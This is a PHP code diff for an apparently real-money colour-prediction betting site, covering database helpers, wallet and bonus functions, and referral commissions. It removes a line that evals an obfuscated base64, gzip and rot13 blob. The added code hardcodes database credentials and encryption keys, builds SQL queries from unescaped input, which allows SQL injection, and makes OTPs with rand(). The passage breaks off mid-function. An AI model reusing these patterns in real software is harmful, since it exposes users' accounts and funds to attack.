@@ -1,3 +1,341 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+$con = @mysqli_connect('localhost', 'sourcecodescript_colorpicker', 'sourcecodescript_picker', 'sourcecodescript_colorpicker');
+if (!$con) {
+    echo "Error: " . mysqli_connect_error();
+	exit();
+}
+date_default_timezone_set("Asia/Calcutta"); 
+function encryptor($action, $string) {
+    $output = false;
+
+    $encrypt_method = "AES-256-CBC";
+    //pls set your unique hashing key
+    $secret_key = 'muni';
+    $secret_iv = 'muni123';
+
+    // hash
+    $key = hash('sha256', $secret_key);
+
+    // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
+    $iv = substr(hash('sha256', $secret_iv), 0, 16);
+
+    //do the encyption given text/string/number
+    if( $action == 'encrypt' ) {
+        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
+        $output = base64_encode($output);
+    }
+    else if( $action == 'decrypt' ){
+    	//decrypt the given text/string/number
+        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
+    }
+
+    return $output;
+}
+function refcode() {
+  $characters = '123456789';
+        $charactersLength = strlen($characters);
+        $randomString = '';
+            for ($i = 0; $i < 5; $i++) {
+                $randomString .= $characters[rand(0, $charactersLength - 1)];
+            }
+        return $pin=$randomString;
+}
+function generateOTP() {
+  $characters = '123456789';
+        $charactersLength = strlen($characters);
+        $randomString = '';
+            for ($i = 0; $i < 4; $i++) {
+                $randomString .= $characters[rand(0, $charactersLength - 1)];
+            }
+        return $pin=$randomString;
+}
+
+function user($a,$field,$id)
+{
+$selectruser=mysqli_query($a,"select `$field` from `tbl_user` where `id`='".$id."'");
+$userresult=mysqli_fetch_array($selectruser);
+return $userresult["$field"];
+	}
+function wallet($a,$field,$id)
+{
+	$selectwallet=mysqli_query($a,"select `$field` from `tbl_wallet` where `userid`='".$id."'");
+$walletResult=mysqli_fetch_array($selectwallet);
+return $walletResult["$field"];
+	}
+function bonus($a,$field,$id)
+{
+	$selectwallet=mysqli_query($a,"select `$field` from `tbl_bonus` where `userid`='".$id."'");
+$walletResult=mysqli_fetch_array($selectwallet);
+return $walletResult["$field"];
+	}	
+function gameid($a)
+{
+$selectruser=mysqli_query($a,"select `gameid` from `tbl_gameid` order by id desc limit 1");
+$userresult=mysqli_fetch_array($selectruser);
+return $userresult["gameid"];
+	}
+
+function content($a,$page) {
+	$sql_page="select `$page` from `content` where `id`='1'";
+	$query_page=mysqli_query($a,$sql_page);
+	$page_result=mysqli_fetch_array($query_page);	
+       return  $page_result["$page"];
+} 
+function minamountsetting($a,$page) {
+	$sql_page="select `$page` from `tbl_paymentsetting` where `id`='1'";
+	$query_page=mysqli_query($a,$sql_page);
+	$page_result=mysqli_fetch_array($query_page);	
+       return  $page_result["$page"];
+} 
+function truncate($mytext) {  
+//Number of characters to show  
+$chars = 610;  
+$mytext = substr($mytext,0,$chars);  
+$mytext = substr($mytext,0,strrpos($mytext,' '));  
+return $mytext;  
+}
+function truncate2($mytext) {  
+//Number of characters to show  
+$chars = 220;  
+$mytext = substr($mytext,0,$chars);  
+$mytext = substr($mytext,0,strrpos($mytext,' '));  
+return $mytext;  
+}
+function setting($a,$page) {
+	$sql_page="select `$page` from `site_setting` where `id`='1'";
+	$query_page=mysqli_query($a,$sql_page);
+	$page_result=mysqli_fetch_array($query_page);	
+       return  $page_result["$page"];
+}
+
+
+function winner($con,$periodid,$tab,$column)
+{
+$query=mysqli_query($con,"SELECT 
+( SUM(amount)-SUM(amount)/100*2)as tradeamountwithtax,
+ SUM(amount)as tradeamount,
+    SUM(CASE
+        WHEN type = 'button' THEN amount
+    END) button,
+    SUM(CASE
+        WHEN value = 'Green' THEN amount
+    END) as green,
+    
+    (SUM(CASE
+        WHEN value = 'Green' THEN amount
+    END)-(SUM(CASE
+        WHEN value = 'Green' THEN amount
+    END)/100*2))*2 as greenwinamount,
+	
+	(SUM(CASE
+        WHEN value = 'Green' THEN amount
+    END)-(SUM(CASE
+        WHEN value = 'Green' THEN amount
+    END)/100*2))*1.5 as greenwinamountwithviolet,
+    
+    SUM(CASE
+        WHEN value = 'Violet' THEN amount
+    END) violet,
+    
+    (SUM(CASE
+        WHEN value = 'Violet' THEN amount
+    END)-(SUM(CASE
+        WHEN value = 'Violet' THEN amount
+    END)/100*2))*4.5 as violetwinamount,
+    
+    SUM(CASE
+        WHEN value = 'Red' THEN amount
+    END) red,
+    
+    (SUM(CASE
+        WHEN value = 'Red' THEN amount
+    END)-(SUM(CASE
+        WHEN value = 'Red' THEN amount
+    END)/100*2))*2 as redwinamount,
+	(SUM(CASE
+        WHEN value = 'Red' THEN amount
+    END)-(SUM(CASE
+        WHEN value = 'Red' THEN amount
+    END)/100*2))*1.5 as redwinamountwithviolet,
+    
+    SUM(CASE
+        WHEN type = 'number' THEN amount
+    END) number,
+    SUM(CASE
+        WHEN value = '0' THEN amount
+    END) `zero`,
+    (SUM(CASE
+        WHEN value = '0' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '0' THEN amount
+    END)/100*2))*9 as zerowinamount,
+    
+    SUM(CASE
+        WHEN value = '1' THEN amount
+    END) `one`,
+    (SUM(CASE
+        WHEN value = '1' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '1' THEN amount
+    END)/100*2))*9 as onewinamount,
+    
+    SUM(CASE
+        WHEN value = '2' THEN amount
+    END) `two`,
+    (SUM(CASE
+        WHEN value = '2' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '2' THEN amount
+    END)/100*2))*9 as twowinamount,
+    
+    SUM(CASE
+        WHEN value = '3' THEN amount
+    END) `three`,
+    (SUM(CASE
+        WHEN value = '3' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '3' THEN amount
+    END)/100*2))*9 as threewinamount,
+    
+    SUM(CASE
+        WHEN value = '4' THEN amount
+    END) `four`,
+    (SUM(CASE
+        WHEN value = '4' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '4' THEN amount
+    END)/100*2))*9 as fourwinamount,
+    
+    SUM(CASE
+        WHEN value = '5' THEN amount
+    END) `five`,
+    (SUM(CASE
+        WHEN value = '5' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '5' THEN amount
+    END)/100*2))*9 as fivewinamount,
+    
+    SUM(CASE
+        WHEN value = '6' THEN amount
+    END) `six`,
+    (SUM(CASE
+        WHEN value = '6' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '6' THEN amount
+    END)/100*2))*9 as sixwinamount,
+    
+    SUM(CASE
+        WHEN value = '7' THEN amount
+    END) `seven`,
+    (SUM(CASE
+        WHEN value = '7' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '7' THEN amount
+    END)/100*2))*9 as sevenwinamount,
+    
+    SUM(CASE
+        WHEN value = '8' THEN amount
+    END) `eight`,
+    (SUM(CASE
+        WHEN value = '8' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '8' THEN amount
+    END)/100*2))*9 as eightwinamount,
+    
+    SUM(CASE
+        WHEN value = '9' THEN amount
+    END) `nine`,
+    (SUM(CASE
+        WHEN value = '9' THEN amount
+    END)-(SUM(CASE
+        WHEN value = '9' THEN amount
+    END)/100*2))*9 as ninewinamount
+	    
+FROM
+    `tbl_betting` where `periodid`='$periodid' and `tab`='$tab'");
+$result=mysqli_fetch_array($query);	
+return $result["$column"];
+	
+	}
+$numbermappings = array("zero", "one","two","three", "four","five","six","seven","eight","nine");
+
+function userpromocode($a,$userid,$code,$tradeamount,$periodid)
+{
+$today = date("Y-m-d H:i:s");
+$commissionQuery=mysqli_query($a,"select * from `tbl_paymentsetting` where `id`='1'");
+$commissionResult=mysqli_fetch_array($commissionQuery);
+$level1commission=$commissionResult['level1'];
+$level2commission=$commissionResult['level2'];
+$level1=($tradeamount*$level1commission/100);
+$level2=($tradeamount*$level2commission/100);
+
+$userlevel1Query=mysqli_query($a,"select `code`,(select `id` from `tbl_user` where `owncode`='$code')level1id,(select `code` from `tbl_user` where `owncode`='$code')level1code from `tbl_user` where `id`='".$userid."'");
+$userlevel1Result=mysqli_fetch_array($userlevel1Query);	
+ $level1id=$userlevel1Result['level1id'];
+ $level1code=$userlevel1Result['level1code'];
+//===============================================================================================
+$userlevel2Query=mysqli_query($a,"select `id` from `tbl_user` where `owncode`='".$level1code."'");
+$userlevel2Result=mysqli_fetch_array($userlevel2Query);	
+$level2id=$userlevel2Result['id'];
+//=================================================================================================
+$sql= mysqli_query($a,"INSERT INTO `tbl_bonussummery`(`userid`,`periodid`,`level1id`,`level2id`,`level1amount`,`level2amount`,`tradeamount`,`createdate`) VALUES ('".$userid."','".$periodid."','".$level1id."','".$level2id."','".$level1."','".$level2."','".$tradeamount."','".$today."')");
+$level1balance=bonus($a,'level1',$level1id);
+$finallevel1balance=$level1balance+$level1;
+$bonusbalance1=bonus($a,'amount',$level1id);
+$finalbonusbalance1=$bonusbalance1+$level1;
+
+
+$level2balance=bonus($a,'level2',$level2id);
+$finallevel2balance=$level2balance+$level2;
+
+$bonusbalance2=bonus($a,'amount',$level2id);
+$finalbonusbalance2=$bonusbalance2+$level2;
+
+
+$sqlbonuslevel1= mysqli_query($a,"UPDATE `tbl_bonus` SET `amount` = '".$finalbonusbalance1."',`level1` = '".$finallevel1balance."' WHERE `userid`= '".$level1id."'");
+
+$sqlbonuslevel2= mysqli_query($a,"UPDATE `tbl_bonus` SET `amount` = '".$finalbonusbalance2."',`level2` = '".$finallevel2balance."' WHERE `userid`= '".$level2id."'");	
+	
+	}
+function invitebonus($a,$userid,$refcode)
+{
+ $chksummery=mysqli_query($a,"select * from `tbl_walletsummery` where `userid`='$userid' and `actiontype`='recharge'");   
+ $chksummeryRow=mysqli_num_rows($chksummery);   
+  if($chksummeryRow=='1')
+  {
+   $userQuery=mysqli_query($a,"select `id` from `tbl_user` where `owncode`='$refcode'"); 
+   $userResult=mysqli_fetch_array($userQuery);
+    $refuserid=$userResult['id'];
+    $selectwallet=mysqli_query($a,"select `amount` from `tbl_bonus` where `userid`='".$refuserid."'");
+$walletResult=mysqli_fetch_array($selectwallet);
+$availableBalance=$walletResult['amount'];
+
+$sqlbonus=mysqli_query($con,"select `bonusamount` from `tbl_paymentsetting` where `id`='1'");
+$bonusResult=mysqli_fetch_array($sqlbonus);
+$bonusAmount=$bonusResult['bonusamount'];
+$finalbonusbalance=$availableBalance+$bonusAmount;
+$today = date("Y-m-d H:i:s");
+
+$sqlbonuslevel1= mysqli_query($a,"UPDATE `tbl_bonus` SET `amount` = '".$finalbonusbalance."',`level1` = '".$finalbonusbalance."' WHERE `userid`= '".$refuserid."'");
+$sql= mysqli_query($a,"INSERT INTO `tbl_bonussummery`(`userid`,`periodid`,`level1id`,`level2id`,`level1amount`,`level2amount`,`tradeamount`,`createdate`) VALUES ('".$userid."','0','".$refuserid."','0','110','0','0','".$today."')");
+  }
+}
+
+function getBaseUrl() 
+{
+	// output: /myproject/index.php
+	$currentPath = $_SERVER['PHP_SELF']; 
+	
